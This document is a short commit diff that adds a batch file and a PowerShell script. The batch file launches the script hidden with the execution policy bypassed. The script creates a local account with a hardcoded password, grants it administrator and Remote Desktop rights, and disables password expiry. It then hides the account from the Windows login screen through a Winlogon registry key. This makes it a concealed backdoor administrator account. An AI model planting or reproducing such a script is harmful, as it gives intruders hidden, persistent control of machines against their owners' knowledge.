a800bd871df7c7aba306d848c823d4164a777e52
anti-box <bclee6c@daum.net>
2026-02-10 16:31:35 +0900

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,3 @@
+mode 15,1
+@echo off
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\NextApp\1.ps1" -exit
---
+++ 1.ps1
@@ -0,0 +1,12 @@
+﻿$userName = "$admin"
+$password = "admin123!@#"
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+New-LocalUser -Name $userName -Password $securePassword -FullName "Remote Admin User" -Description "User with Admin and Remote Access"
+Add-LocalGroupMember -Group "Administrators" -Member $userName
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member $userName
+Set-LocalUser -Name $userName -PasswordNeverExpires 1
+$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\$userName"
+if (-not (Test-Path $path)) {
+    New-Item -Path $path -Force | Out-Null
+}
+New-ItemProperty -Path $path -Name $userName -Value 0 -PropertyType DWord -Force | Out-Null
